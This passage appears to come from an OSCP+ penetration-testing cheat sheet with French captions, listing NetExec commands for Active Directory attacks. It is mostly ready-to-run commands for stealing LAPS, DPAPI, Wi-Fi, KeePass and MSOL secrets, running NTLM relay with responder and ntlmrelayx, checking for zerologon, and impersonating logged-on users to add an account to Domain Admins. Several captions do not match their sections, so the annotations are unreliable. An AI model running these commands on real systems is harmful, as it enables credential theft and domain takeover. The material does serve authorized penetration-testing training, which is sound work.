netexec smb [target] -u [username] -p [password] --laps --dpapi
```


```bash
netexec smb [target] -u [username] -p [password] -M wifi
```


<p class="oscp-command-note">Exemple avec l&#x27;outil nxc.</p>

```bash
# You can check if keepass is installed on the target computer and then steal the master password and decrypt the database
nxc smb [target] -u [username] -p [password] -M keepass_discover

nxc smb [target] -u [username] -p [password] -M keepass_trigger -o KEEPASS_CONFIG_PATH="path_from_module_discovery"
```


### BloodHound

Examiner les objets, les droits et les services du domaine.


<p class="oscp-command-note">Exemple technique pour la rubrique « BloodHound ».</p>

```text
~/.nxc/nxc.conf
```


```text
[BloodHound]
bh_enabled = True
bh_uri = 127.0.0.1
bh_port = 7687
bh_user = user
bh_pass = pass
```


<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>

```bash
netexec ldap [target] -u [username] -p [password] --bloodhound -ns ip --collection All
```


#### Webdav

Examiner les entrées et les réponses de l'application web.


<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>

```bash
netexec smb ip -u [username] -p [password] -M webdav 
```


#### Veeam


<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>

```bash
netexec smb [target] -u [username] -p [password] -M veeam
```


#### slinky


<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>

```bash
netexec smb ip -u [username] -p [password] -M slinky 
```


#### ntdsutil


<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>

```bash
netexec smb ip -u [username] -p [password] -M ntdsutil 
```


#### LDAP-checker

Examiner les objets, les droits et les services du domaine.


<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>

```bash
netexec ldap [target] -u [username] -p [password] -M ldap-checker
```


#### Check if the DC is vulnerable to zerologon, petitpotam, nopac


<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>

```bash
netexec smb [target] -u [username] -p [password] -M zerologon

netexec smb [target] -u [username] -p [password] -M petitpotam

netexec smb [target] -u [username] -p [password] -M nopac
```


#### Check the MachineAccountQuota


<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>

```bash
netexec ldap [target] -u [username] -p [password] -M maq
```


#### ADCS Énumération


<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>

```bash
netexec ldap [target] -u [username] -p [password] -M adcs
```


#### Retrieve MSOL Account Password

Vérifier les comptes, les secrets et les mécanismes d'authentification.


<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>

```bash
netexec smb [target] -u [username] -p [password] -M msol
```


#### NTLM Relay Attack


<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>

```bash
netexec smb [target(s)] --gen-relay-list relay.txt

# Alternative with Nmap
nmap --script smb-security-mode.nse,smb2-security-mode.nse -p445 [target(s)]

# Expected Results
SMB         192.168.1.101    445    DC2012A          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012A) (domain:OCEAN) (signing:True) (SMBv1:True)
SMB         192.168.1.102    445    DC2012B          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012B) (domain:EARTH) (signing:True) (SMBv1:True)
SMB         192.168.1.111    445    SERVER1          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:SERVER1) (domain:PACIFIC) (signing:False) (SMBv1:True)
SMB         192.168.1.117    445    WIN10DESK1       [*] WIN10DESK1 x64 (name:WIN10DESK1) (domain:OCEAN) (signing:False) (SMBv1:True)
...SNIP...

cat relay_list.txt
192.168.1.111
192.168.1.117
```


<p class="oscp-command-note">Exemple avec l&#x27;outil responder.</p>

```bash
responder -I eth0
```


<p class="oscp-command-note">Exemple avec l&#x27;outil impacket-ntlmrelayx.</p>

```bash
impacket-ntlmrelayx -tf relay.txt -smb2support
```


### Impersonate logged-on Users


<p class="oscp-command-note">Exemple avec l&#x27;outil nxc.</p>

```bash
nxc smb [target] -u [localAdmin] -p [password] --loggedon-users
```


```bash
nxc smb [target] -u [localAdmin] -p [password] -M schtask_as -o USER=[logged-on-user] CMD=[cmd-command]

# Custom command to add a user to the domain admin group: powershell.exe \"Invoke-Command -ComputerName [DC_NAME] -ScriptBlock {Add-ADGroupMember -Identity 'Domain Admins' -Members USER.NAME}\"
```

![Impersonate Logged In Users with NetExec.](https://www.emmanuelsolis.com/img/netexec_01.png)


### Multi-Domain Environment

Examiner les objets, les droits et les services du domaine.


<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>

```bash
netexec [protocol] [target(s)] -u FILE -p password
```


<p class="oscp-command-note">Exemple avec l&#x27;outil domain1.</p>

```text
DOMAIN1\user
DOMAIN2\user
```


<p class="oscp-command-note">Exemple technique pour la rubrique « Multi-Domain Environment ».</p>

```text
[domains]\[users]
```


<p class="oscp-command-note">Exemple avec l&#x27;outil python3.</p>

```bash
python3 script.py -u [users_list].txt -d [domains_list].txt
```


<p class="oscp-command-note">Exemple avec l&#x27;outil import.</p>

```python
import argparse

def main():
    # Set up argument parsing
    parser = argparse.ArgumentParser(description="Generate combinations of domains and users.")
    parser.add_argument("-d", "--domain", required=True, help="Path to the domains file")
    parser.add_argument("-u", "--users", required=True, help="Path to the users file")
    parser.add_argument("-o", "--output", default="output.txt", help="Output file name (default: output.txt)")
    args = parser.parse_args()

    # Read the domains and users from the provided files
    try:
        with open(args.domain, "r") as domains_file:
            domains = [line.strip() for line in domains_file.readlines()]

        with open(args.users, "r") as users_file:
            users = [line.strip() for line in users_file.readlines()]
    except FileNotFoundError as e:
        print(f"Error: {e}")
        return

    # Generate combinations
    combinations = [f"{domain}\\{user}" for user in users for domain in domains]

    # Write the combinations to the output file
    with open(args.output, "w") as output_file:
        output_file.write("\n".join(combinations))

    print(f"Combinations generated and saved to {args.output}!")

if __name__ == "__main__":
    main()
```

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
